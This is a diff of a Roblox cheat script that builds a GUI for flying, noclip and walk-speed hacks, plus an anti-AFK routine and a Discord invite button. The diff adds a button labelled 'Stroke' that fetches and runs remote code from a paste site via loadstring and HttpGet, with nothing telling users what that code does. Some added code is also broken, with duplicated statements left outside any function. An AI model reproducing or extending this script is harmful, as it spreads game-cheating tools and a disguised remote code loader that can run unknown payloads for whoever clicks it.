@@ -5,6 +5,12 @@ local character = player.Character or player.CharacterAdded:Wait()
 local humanoid = character:WaitForChild("Humanoid")
 local rootPart = character:WaitForChild("HumanoidRootPart")
 
+
+local sound = Instance.new("Sound")
+sound.SoundId = "rbxassetid://6518811702" -- Replace with your desired sound ID
+sound.Volume = 0.5
+sound.Parent = workspace
+sound:Play()
 -- Ensure PlayerGui exists
 if not player:FindFirstChild("PlayerGui") then
     Instance.new("PlayerGui").Parent = player
@@ -14,6 +20,7 @@ end
 local screenGui = Instance.new("ScreenGui")
 screenGui.Parent = player.PlayerGui
 screenGui.Name = "FlyUI"
+screenGui.ResetOnSpawn = false
 
 -- Text Animation at the Beginning
 local textLabel = Instance.new("TextLabel")
@@ -52,10 +59,10 @@ wait(1)
 -- Remove the text label
 textLabel:Destroy()
 
--- Main Frame - EXPANDED HEIGHT for walkspeed slider
+-- Main Frame - EXPANDED WIDTH and HEIGHT for loadstring button
 local frame = Instance.new("Frame")
-frame.Size = UDim2.new(0, 220, 0, 200) -- Increased height from 150 to 200
-frame.Position = UDim2.new(0.5, -110, -0.3, 0) -- Changed from -0.2 to -0.3
+frame.Size = UDim2.new(0, 300, 0, 250) -- Increased width from 220 to 300, height from 200 to 250
+frame.Position = UDim2.new(0.5, -150, -0.3, 0) -- Adjusted X position to center the wider frame
 frame.BackgroundColor3 = Color3.fromRGB(245, 245, 245)
 frame.BorderSizePixel = 0
 frame.ClipsDescendants = true
@@ -175,7 +182,7 @@ flySliderCorner.Parent = flySliderTrack
 local flySliderThumb = Instance.new("TextButton")
 flySliderThumb.Size = UDim2.new(0, 14, 0, 14)
 flySliderThumb.Position = UDim2.new(0.5, -7, 0.3, -5) -- Adjusted position
-flySliderThumb.BackgroundColor3 = Color3.fromRGB(0, 202, 78)
+flySliderThumb.BackgroundColor3 = Color3.fromRGB(192, 191, 192)
 flySliderThumb.Text = ""
 flySliderThumb.AutoButtonColor = false
 flySliderThumb.Parent = frame
@@ -192,7 +199,7 @@ local flyThumbCorner = Instance.new("UICorner")
 flyThumbCorner.CornerRadius = UDim.new(1, 0)
 flyThumbCorner.Parent = flySliderThumb
 
--- NEW: Walk Speed Label
+-- Walk Speed Label
 local walkSpeedLabel = Instance.new("TextLabel")
 walkSpeedLabel.Size = UDim2.new(0.8, 0, 0, 20)
 walkSpeedLabel.Position = UDim2.new(0.1, 0, 0.42, 0)
@@ -203,7 +210,7 @@ walkSpeedLabel.Font = Enum.Font.SourceSans
 walkSpeedLabel.TextSize = 14
 walkSpeedLabel.Parent = frame
 
--- NEW: Walk Speed Slider Track
+-- Walk Speed Slider Track
 local walkSliderTrack = Instance.new("Frame")
 walkSliderTrack.Size = UDim2.new(0.7, 0, 0, 3)
 walkSliderTrack.Position = UDim2.new(0.15, 0, 0.52, 0)
@@ -216,11 +223,11 @@ local walkSliderCorner = Instance.new("UICorner")
 walkSliderCorner.CornerRadius = UDim.new(1, 0)
 walkSliderCorner.Parent = walkSliderTrack
 
--- NEW: Walk Speed Slider Thumb
+-- Walk Speed Slider Thumb
 local walkSliderThumb = Instance.new("TextButton")
 walkSliderThumb.Size = UDim2.new(0, 14, 0, 14)
 walkSliderThumb.Position = UDim2.new(0.15, -7, 0.52, -5) -- Start position at min
-walkSliderThumb.BackgroundColor3 = Color3.fromRGB(0, 122, 255) -- Different color
+walkSliderThumb.BackgroundColor3 = Color3.fromRGB(192, 191, 192) -- Different color
 walkSliderThumb.Text = ""
 walkSliderThumb.AutoButtonColor = false
 walkSliderThumb.Parent = frame
@@ -241,7 +248,7 @@ walkThumbCorner.Parent = walkSliderThumb
 local flyButton = Instance.new("TextButton")
 flyButton.Size = UDim2.new(0.35, 0, 0, 30)
 flyButton.Position = UDim2.new(0.1, 0, 0.65, 0) -- Adjusted position
-flyButton.Text = "Fly: OFF"
+flyButton.Text = "Fly: OFF [F]" -- Added key info to button
 flyButton.BackgroundColor3 = Color3.fromRGB(0, 122, 255)
 flyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 flyButton.Font = Enum.Font.SourceSansBold
@@ -283,11 +290,11 @@ local noclipButtonCorner = Instance.new("UICorner")
 noclipButtonCorner.CornerRadius = UDim.new(0.2, 0)
 noclipButtonCorner.Parent = noclipButton
 
--- NEW: Walk Speed Toggle Button
+-- Walk Speed Toggle Button
 local walkSpeedButton = Instance.new("TextButton")
-walkSpeedButton.Size = UDim2.new(0.8, 0, 0, 30)
+walkSpeedButton.Size = UDim2.new(0.35, 0, 0, 30) -- Changed from 0.8 to 0.35 to match other buttons
 walkSpeedButton.Position = UDim2.new(0.1, 0, 0.82, 0)
-walkSpeedButton.Text = "Walk Speed: OFF"
+walkSpeedButton.Text = "Walk Speed: OFF [X]" -- Added key info to button
 walkSpeedButton.BackgroundColor3 = Color3.fromRGB(0, 202, 78)
 walkSpeedButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 walkSpeedButton.Font = Enum.Font.SourceSansBold
@@ -305,6 +312,95 @@ walkSpeedButtonShadow.Parent = walkSpeedButton
 local walkSpeedButtonCorner = Instance.new("UICorner")
 walkSpeedButtonCorner.CornerRadius = UDim.new(0.2, 0)
 walkSpeedButtonCorner.Parent = walkSpeedButton
+
+-- NEW: LoadString Button
+local loadStringButton = Instance.new("TextButton")
+loadStringButton.Size = UDim2.new(0.35, 0, 0, 30)
+loadStringButton.Position = UDim2.new(0.55, 0, 0.82, 0) -- Position next to walk speed button
+loadStringButton.Text = "Stroke"
+loadStringButton.BackgroundColor3 = Color3.fromRGB(255, 64, 64) -- Red color to make it stand out
+loadStringButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+loadStringButton.Font = Enum.Font.SourceSansBold
+loadStringButton.TextSize = 14
+loadStringButton.Parent = frame
+
+-- Add shadow to loadstring button
+local loadStringButtonShadow = Instance.new("UIStroke")
+loadStringButtonShadow.Color = Color3.fromRGB(0, 0, 0)
+loadStringButtonShadow.Transparency = 0.7
+loadStringButtonShadow.Thickness = 1
+loadStringButtonShadow.Parent = loadStringButton
+
+-- Rounded corners for loadstring button
+local loadStringButtonCorner = Instance.new("UICorner")
+loadStringButtonCorner.CornerRadius = UDim.new(0.2, 0)
+loadStringButtonCorner.Parent = loadStringButton
+
+-- NEW: Discord Button
+local discordButton = Instance.new("TextButton")
+discordButton.Size = UDim2.new(0, 80, 0, 10) -- Small button size
+discordButton.Position = UDim2.new(0.5, -40, 0.95, 0) -- Centered at bottom of frame
+discordButton.Text = "Discord"
+discordButton.BackgroundColor3 = Color3.fromRGB(114, 137, 218) -- Discord blue color
+discordButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+discordButton.Font = Enum.Font.SourceSansBold
+discordButton.TextSize = 14
+discordButton.Parent = frame
+
+-- Add shadow to Discord button
+local discordButtonShadow = Instance.new("UIStroke")
+discordButtonShadow.Color = Color3.fromRGB(0, 0, 0)
+discordButtonShadow.Transparency = 0.7
+discordButtonShadow.Thickness = 1
+discordButtonShadow.Parent = discordButton
+
+-- Rounded corners for Discord button
+local discordButtonCorner = Instance.new("UICorner")
+discordButtonCorner.CornerRadius = UDim.new(0.2, 0)
+discordButtonCorner.Parent = discordButton
+
+-- Small Discord icon (optional)
+local discordIcon = Instance.new("ImageLabel")
+discordIcon.Size = UDim2.new(0, 16, 0, 16)
+discordIcon.Position = UDim2.new(0, 5, 0.5, -8)
+discordIcon.BackgroundTransparency = 1
+discordIcon.Image = "rbxassetid://4494451673" -- Discord icon asset ID
+discordIcon.Parent = discordButton
+
+-- Discord button click function
+discordButton.MouseButton1Click:Connect(function()
+    -- Visual feedback
+    local originalColor = discordButton.BackgroundColor3
+    discordButton.BackgroundColor3 = Color3.fromRGB(78, 93, 148) -- Darker discord color
+    
+    -- Open Discord invite with a Roblox system message
+    local inviteLink = "https://discord.gg/Spyydr4c"
+    
+    -- Use Roblox's internal function to open URL
+    pcall(function()
+        -- First method (GUI method)
+        game:GetService("GuiService"):OpenBrowserWindow(inviteLink)
+    end)
+    
+    -- If the above fails, try alternate method
+    pcall(function()
+        -- Second method (legacy)
+        game:GetService("StarterGui"):SetCore("SendNotification", {
+            Title = "Discord Invite",
+            Text = "Link copied to clipboard: " .. inviteLink,
+            Duration = 5
+        })
+        
+        -- Attempt to copy to clipboard
+        if setclipboard then
+            setclipboard(inviteLink)
+        end
+    end)
+    
+    -- Revert button color after a short delay
+    wait(0.3)
+    discordButton.BackgroundColor3 = originalColor
+end)
 
 -- iPhone Dock Style Notification
 local notification = Instance.new("Frame")
@@ -336,7 +432,7 @@ notificationText.Parent = notification
 local slideIn = TweenService:Create(
     frame,
     TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
-    {Position = UDim2.new(0.5, -110, 0, 10)}
+    {Position = UDim2.new(0.5, -150, 0, 10)}
 )
 slideIn:Play()
 
@@ -347,7 +443,7 @@ local bodyVelocity, bodyGyro
 
 -- Walk Speed Variables
 local defaultWalkSpeed = 16 -- Default Roblox walk speed
-local customWalkSpeed = 16 -- Initial custom walk speed
+local customWalkSpeed = 50 -- Initial custom walk speed
 local walkSpeedEnabled = false -- Walk speed hack toggle
 
 -- NoClip Variables
@@ -399,7 +495,7 @@ local function toggleUI()
         local slideIn = TweenService:Create(
             frame,
             TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
-            {Position = UDim2.new(0.5, -110, 0, 10)}
+            {Position = UDim2.new(0.5, -150, 0, 10)}
         )
         slideIn:Play()
         hideNotification() -- Hide the dock notification
@@ -408,7 +504,7 @@ local function toggleUI()
         local slideOut = TweenService:Create(
             frame,
             TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
-            {Position = UDim2.new(0.5, -110, -0.3, 0)}
+            {Position = UDim2.new(0.5, -150, -0.9, 0)}
         )
         slideOut:Play()
         showNotification() -- Show the dock notification
@@ -424,16 +520,37 @@ closeButton.MouseButton1Click:Connect(function()
     screenGui:Destroy() -- Remove the UI
 end)
 
+-- NEW: LoadString Button Click
+loadStringButton.MouseButton1Click:Connect(function()
+    -- Execute the loadstring
+    loadstring(game:HttpGet("https://pastefy.app/YZoglOyJ/raw"))()
+    
+    -- Visual feedback
+    local originalColor = loadStringButton.BackgroundColor3
+    loadStringButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0) -- Green to indicate success
+    loadStringButton.Text = "Loaded!"
+    
+    -- Revert back after 1 second
+    wait(1)
+    loadStringButton.BackgroundColor3 = originalColor
+    loadStringButton.Text = "Stroke"
+end)
+
 -- Bind UI to Right Alt
 UserInputService.InputBegan:Connect(function(input, gameProcessed)
     if gameProcessed then return end -- Ignore if the game already processed the input
 
     if input.KeyCode == Enum.KeyCode.RightAlt then
         toggleUI()
+    elseif input.KeyCode == Enum.KeyCode.F then
+        -- NEW: F key to toggle fly
+        toggleFly()
+    elseif input.KeyCode == Enum.KeyCode.X then
+        -- NEW: X key to toggle walk speed
+        toggleWalkSpeed()
     end
 end)
 
--- Function to update the fly speed slider
 local function updateFlySlider(input)
     -- Get slider track dimensions and position
     local sliderWidth = flySliderTrack.AbsoluteSize.X
@@ -441,35 +558,55 @@ local function updateFlySlider(input)
     local sliderEnd = sliderStart + sliderWidth
     local mouseX = input.Position.X
     
-    -- Get the thumb half-width for proper edge calculations
-    local thumbHalfWidth = flySliderThumb.AbsoluteSize.X / 2
-    
     -- Calculate percentage based on mouse position relative to slider track
-    -- Adjust the boundaries to account for the thumb width
-    local thumbPosition = math.clamp(mouseX, sliderStart + thumbHalfWidth, sliderEnd - thumbHalfWidth)
-    local relativePosition = (thumbPosition - sliderStart - thumbHalfWidth) / (sliderWidth - thumbHalfWidth * 2)
-    
-    -- Set position in scale and offset format
-    local scalePosition = relativePosition
-    
-    -- Adjust position to keep thumb within track bounds
-    if scalePosition < 0 then scalePosition = 0 end
-    if scalePosition > 1 then scalePosition = 1 end
+    local relativePosition = math.clamp((mouseX - sliderStart) / sliderWidth, 0, 1)
     
     -- Calculate the proper scale position within the track
     local trackStartScale = 0.15 -- from the track's position
     local trackWidthScale = 0.7 -- from the track's size
-    local actualScale = trackStartScale + (scalePosition * trackWidthScale)
+    local actualScale = trackStartScale + (relativePosition * trackWidthScale)
     
     -- Update thumb position (aligned with the track boundaries)
     flySliderThumb.Position = UDim2.new(actualScale, -7, 0.3, -5)
     
     -- Update fly speed based on position (10 to 100)
-    flySpeed = math.floor(10 + (scalePosition * 90))
+    flySpeed = math.floor(10 + (relativePosition * 90))
     flySpeedLabel.Text = "Fly Speed: " .. flySpeed
+    
+    -- Update velocity immediately if currently flying
+    if flying and bodyVelocity then
+        local camera = workspace.CurrentCamera
+        local direction = Vector3.new(0, 0, 0)
+        
+        -- Get current direction from keys
+        if UserInputService:IsKeyDown(Enum.KeyCode.W) then
+            direction = direction + camera.CFrame.LookVector
+        end
+        if UserInputService:IsKeyDown(Enum.KeyCode.S) then
+            direction = direction - camera.CFrame.LookVector
+        end
+        if UserInputService:IsKeyDown(Enum.KeyCode.A) then
+            direction = direction - camera.CFrame.RightVector
+        end
+        if UserInputService:IsKeyDown(Enum.KeyCode.D) then
+            direction = direction + camera.CFrame.RightVector
+        end
+        if UserInputService:IsKeyDown(Enum.KeyCode.Space) then
+            direction = direction + Vector3.new(0, 1, 0)
+        end
+        if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then
+            direction = direction - Vector3.new(0, 1, 0)
+        end
+        
+        -- Normalize and apply new speed
+        if direction.Magnitude > 0 then
+            direction = direction.Unit
+        end
+        bodyVelocity.Velocity = direction * flySpeed
+    end
 end
 
--- NEW: Function to update the walk speed slider
+-- Function to update the walk speed slider
 local function updateWalkSlider(input)
     -- Get slider track dimensions and position
     local sliderWidth = walkSliderTrack.AbsoluteSize.X
@@ -509,6 +646,34 @@ local function updateWalkSlider(input)
     end
 end
 
+-- Walk Speed Slider Drag Event
+walkSliderThumb.MouseButton1Down:Connect(function()
+    local connection
+    connection = UserInputService.InputChanged:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseMovement then
+            updateWalkSlider(input)
+        end
+    end)
+
+    -- Stop dragging when mouse button is released
+    local endConn
+    endConn = UserInputService.InputEnded:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 then
+            if connection then
+                connection:Disconnect()
+            end
+            endConn:Disconnect()
+        end
+    end)
+end)
+
+-- Allow clicking directly on the walk slider track
+walkSliderTrack.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        updateWalkSlider(input)
+    end
+end)
+
 -- Fly Slider Drag Event
 flySliderThumb.MouseButton1Down:Connect(function()
     local connection
@@ -537,39 +702,11 @@ flySliderTrack.InputBegan:Connect(function(input)
     end
 end)
 
--- NEW: Walk Speed Slider Drag Event
-walkSliderThumb.MouseButton1Down:Connect(function()
-    local connection
-    connection = UserInputService.InputChanged:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseMovement then
-            updateWalkSlider(input)
-        end
-    end)
-
-    -- Stop dragging when mouse button is released
-    local endConn
-    endConn = UserInputService.InputEnded:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseButton1 then
-            if connection then
-                connection:Disconnect()
-            end
-            endConn:Disconnect()
-        end
-    end)
-end)
-
--- NEW: Allow clicking directly on the walk speed track to move the thumb
-walkSliderTrack.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-        updateWalkSlider(input)
-    end
-end)
-
 -- Function to enable flying
 local function enableFly()
     if flying then return end -- Prevent multiple flying states
     flying = true
-    flyButton.Text = "Fly: ON"
+    flyButton.Text = "Fly: ON [F]" -- Updated text with key info
     humanoid.PlatformStand = true -- Disable gravity for the character
 
     -- Create a BodyVelocity for movement
@@ -608,23 +745,21 @@ local function enableFly()
             if UserInputService:IsKeyDown(Enum.KeyCode.Space) then
                 direction = direction + Vector3.new(0, 1, 0)
             end
-            if UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then
-                direction = direction + Vector3.new(0, -1, 0)
+            if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then
+                direction = direction - Vector3.new(0, 1, 0)
             end
 
-            -- Normalize direction and apply speed
+            -- Normalize the direction vector (to keep consistent speed in all directions)
             if direction.Magnitude > 0 then
-                direction = direction.Unit * flySpeed
+                direction = direction.Unit
             end
 
-            -- Update velocity
-            if bodyVelocity then
-                bodyVelocity.Velocity = direction
-            end
-            if bodyGyro then
-                bodyGyro.CFrame = CFrame.new(rootPart.Position, rootPart.Position + camera.CFrame.LookVector)
-            end
-
+            -- Apply velocity in the direction of movement
+            bodyVelocity.Velocity = direction * flySpeed
+            
+            -- Update BodyGyro to maintain orientation with camera
+            bodyGyro.CFrame = CFrame.new(Vector3.new(0, 0, 0), camera.CFrame.LookVector)
+            
             wait()
         end
     end)
@@ -632,11 +767,12 @@ end
 
 -- Function to disable flying
 local function disableFly()
-    if not flying then return end -- Prevent multiple disable calls
+    if not flying then return end
     flying = false
-    flyButton.Text = "Fly: OFF"
-
-    -- Clean up when flying is disabled
+    flyButton.Text = "Fly: OFF [F]"
+    humanoid.PlatformStand = false
+    
+    -- Remove the flying instances
     if bodyVelocity then
         bodyVelocity:Destroy()
         bodyVelocity = nil
@@ -645,133 +781,184 @@ local function disableFly()
         bodyGyro:Destroy()
         bodyGyro = nil
     end
-    humanoid.PlatformStand = false
 end
 
--- NEW: Function to enable walkspeed hack
-local function enableWalkSpeed()
-    if walkSpeedEnabled then return end
-    walkSpeedEnabled = true
-    walkSpeedButton.Text = "Walk Speed: ON"
-    
-    -- Store original walk speed for later restoration
-    defaultWalkSpeed = humanoid.WalkSpeed
-    
-    -- Apply custom walk speed
-    humanoid.WalkSpeed = customWalkSpeed
-end
-
--- NEW: Function to disable walkspeed hack
-local function disableWalkSpeed()
-    if not walkSpeedEnabled then return end
-    walkSpeedEnabled = false
-    walkSpeedButton.Text = "Walk Speed: OFF"
-    
-    -- Restore original walk speed
-    humanoid.WalkSpeed = defaultWalkSpeed
-end
-
--- Function to enable NoClip
-local function enableNoClip()
-    if noclip then return end -- Prevent multiple NoClip states
-    noclip = true
-    noclipButton.Text = "NoClip: ON"
-
-    -- NoClip loop
-    noclipConnection = game:GetService("RunService").Stepped:Connect(function()
-        for _, part in pairs(character:GetDescendants()) do
-            if part:IsA("BasePart") then
-                part.CanCollide = false
-            end
-        end
-    end)
-end
-
--- Function to disable NoClip
-local function disableNoClip()
-    if not noclip then return end -- Prevent multiple disable calls
-    noclip = false
-    noclipButton.Text = "NoClip: OFF"
-
-    -- Re-enable collisions for all parts
-    for _, part in pairs(character:GetDescendants()) do
-        if part:IsA("BasePart") then
-            part.CanCollide = true
-        end
-    end
-
-    -- Disconnect the NoClip loop
-    if noclipConnection then
-        noclipConnection:Disconnect()
-        noclipConnection = nil
-    end
-end
-
--- Toggle flying with the fly button
-flyButton.MouseButton1Click:Connect(function()
+-- Function to toggle flying
+function toggleFly()
     if flying then
         disableFly()
     else
         enableFly()
     end
-end)
-
--- Toggle walking speed with the walk speed button
-walkSpeedButton.MouseButton1Click:Connect(function()
+end
+ 
+    -- Function to toggle walk speed
+function toggleWalkSpeed()
+    walkSpeedEnabled = not walkSpeedEnabled
+    
     if walkSpeedEnabled then
-        disableWalkSpeed()
-    else
-        enableWalkSpeed()
-    end
-end)
-
--- Toggle flying with the F key
-UserInputService.InputBegan:Connect(function(input, gameProcessed)
-    if gameProcessed then return end -- Ignore if the game already processed the input
-
-    if input.KeyCode == Enum.KeyCode.F then -- Press "F" to toggle flying
-        if flying then
-            disableFly()
-        else
-            enableFly()
+        walkSpeedButton.Text = "Walk Speed: ON [X]"
+        walkSpeedButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0) -- Red when active
+        
+        -- Apply custom walk speed
+        if humanoid then
+            humanoid.WalkSpeed = customWalkSpeed
         end
+    else
+        walkSpeedButton.Text = "Walk Speed: OFF [X]"
+        walkSpeedButton.BackgroundColor3 = Color3.fromRGB(0, 202, 78) -- Green when inactive
+        
+        -- Reset to default walk speed
+        if humanoid then
+            humanoid.WalkSpeed = defaultWalkSpeed
+        end
+    end
+end
+    
+    -- Disconnect any existing connection first
+    if noclipConnection then
+        noclipConnection:Disconnect()
+        noclipConnection = nil
     end
     
-    -- NEW: Toggle walk speed with X key
-    if input.KeyCode == Enum.KeyCode.X then -- Press "X" to toggle walk speed
-        if walkSpeedEnabled then
-            disableWalkSpeed()
-        else
-            enableWalkSpeed()
+    -- Disconnect any existing connection first
+    if noclipConnection then
+        noclipConnection:Disconnect()
+        noclipConnection = nil
+    end
+    
+-- Function to toggle NoClip
+local function toggleNoClip()
+    noclip = not noclip
+    
+    -- Disconnect any existing connection first
+    if noclipConnection then
+        noclipConnection:Disconnect()
+        noclipConnection = nil
+    end
+    
+    if noclip then
+        noclipButton.Text = "NoClip: ON"
+        
+        -- Connect NoClip function to RunService
+        noclipConnection = game:GetService("RunService").Stepped:Connect(function()
+            if character and character.Parent then
+                for _, part in pairs(character:GetDescendants()) do
+                    if part:IsA("BasePart") and part.CanCollide then
+                        part.CanCollide = false
+                    end
+                end
+            end
+        end)
+    else
+        noclipButton.Text = "NoClip: OFF"
+        
+        -- Reset collision for character parts
+        if character and character.Parent then
+            for _, part in pairs(character:GetDescendants()) do
+                if part:IsA("BasePart") then
+                    if part.Name == "HumanoidRootPart" then
+                        part.CanCollide = false
+                    elseif part.Name == "Head" then
+                        part.CanCollide = false
+                    elseif part.Name:find("Handle") then
+                        part.CanCollide = false
+                    else
+                        part.CanCollide = true
+                    end
+                end
+            end
         end
     end
-end)
+end
 
--- Toggle NoClip with the noclip button
-noclipButton.MouseButton1Click:Connect(function()
-    if noclip then
-        disableNoClip()
-    else
-        enableNoClip()
-    end
-end)
+-- Connect buttons to their toggle functions
+flyButton.MouseButton1Click:Connect(toggleFly)
+noclipButton.MouseButton1Click:Connect(toggleNoClip)
+walkSpeedButton.MouseButton1Click:Connect(toggleWalkSpeed)
 
--- Character respawn handling
+-- Handle character respawning
 player.CharacterAdded:Connect(function(newCharacter)
+    -- Update character references
     character = newCharacter
     humanoid = character:WaitForChild("Humanoid")
     rootPart = character:WaitForChild("HumanoidRootPart")
     
-    -- Reset states if needed
+    -- Reset flying state
     if flying then
-        disableFly()
+        -- Update UI state first
+        flyButton.Text = "Fly: OFF [F]"
+        
+        -- Clean up existing instances
+        if bodyVelocity then
+            bodyVelocity:Destroy()
+            bodyVelocity = nil
+        end
+        if bodyGyro then
+            bodyGyro:Destroy()
+            bodyGyro = nil
+        end
+        
+        -- Wait a short time before resetting flying state to allow character to fully load
+        wait(0.1)
+        flying = false
+        humanoid.PlatformStand = false
     end
-    if noclip then
-        disableNoClip()
-    end
-    if walkSpeedEnabled then
-        -- Re-enable walk speed after character respawn
-        wait(0.5) -- Wait for character to fully load
-        humanoid.WalkSpeed = customWalkSpeed
+    
+    -- Reapply walk speed settings after a short delay
+    spawn(function()
+        wait(0.1)
+        if walkSpeedEnabled then
+            humanoid.WalkSpeed = customWalkSpeed
+        else
+            humanoid.WalkSpeed = defaultWalkSpeed
+        end
+    end)
+end)
+    
+
+-- Anti-AFK (prevent Roblox from kicking player for inactivity)
+local antiAFK = game:GetService("Players").LocalPlayer.Idled:Connect(function()
+    game:GetService("VirtualUser"):Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
+    wait(1)
+    game:GetService("VirtualUser"):Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
+end)
+
+-- Clean up if the script is terminated
+screenGui.AncestryChanged:Connect(function(_, newParent)
+    if not newParent then
+        -- Clean up when the GUI is removed
+        if flying then
+            disableFly()
+        end
+        
+        noclip = false -- Add this line to reset the noclip state
+        
+        if noclipConnection then
+            noclipConnection:Disconnect()
+            noclipConnection = nil
+        end
+        
+        if antiAFK then
+            antiAFK:Disconnect()
+        end
+        
+        -- Reset walk speed
+        if humanoid and walkSpeedEnabled then
+            humanoid.WalkSpeed = defaultWalkSpeed
+        end
+        
+        -- Reset collision for all parts
+        if character and character.Parent then
+            for _, part in pairs(character:GetDescendants()) do
+                if part:IsA("BasePart") then
+                    if part.Name == "HumanoidRootPart" then
+                        part.CanCollide = false
+                    else
+                        part.CanCollide = true
+                    end
+                end
+            end
+        end
     end
 end)
